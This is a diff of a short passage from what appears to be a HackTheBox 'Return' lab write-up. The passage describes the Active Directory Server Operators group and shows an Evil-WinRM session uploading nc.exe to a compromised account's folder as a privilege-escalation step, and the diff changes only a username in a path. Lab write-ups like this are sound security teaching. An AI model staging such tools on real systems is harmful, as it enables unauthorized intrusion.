@@ -1,9 +1,9 @@
 **Server Operators** is a built-in group in Active Directory that grants members specific administrative capabilities over domain controllers. Members can manage services, including starting and stopping most services, perform backup and restore operations, shut down and restart the server, and handle disk management tasks.
 
 ```bash
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload /home/gareth/htb/return/nc.exe
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload /home/garffff/htb/return/nc.exe
                                         
-Info: Uploading /home/gareth/htb/return/nc.exe to C:\Users\svc-printer\Documents\nc.exe
+Info: Uploading /home/garffff/htb/return/nc.exe to C:\Users\svc-printer\Documents\nc.exe
                                         
 Data: 37544 bytes of 37544 bytes copied
                                         
